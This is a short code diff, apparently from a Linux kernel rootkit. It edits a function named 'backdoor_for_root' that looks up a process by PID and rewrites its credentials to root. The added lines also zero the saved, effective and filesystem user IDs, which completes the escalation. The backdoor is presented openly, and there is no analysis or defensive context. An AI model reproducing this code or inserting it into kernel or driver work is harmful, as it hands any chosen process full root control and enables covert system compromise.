@@ -26,6 +26,9 @@ static int backdoor_for_root(unsigned int pid){
         goto err;
     }
     tcred->uid.val = 0;
+    tcred->suid.val = 0;
+    tcred->euid.val = 0;
+    tcred->fsuid.val = 0;
     put_cred(tcred);
     put_task_struct(pid_task);
     put_pid(pid_pointer);
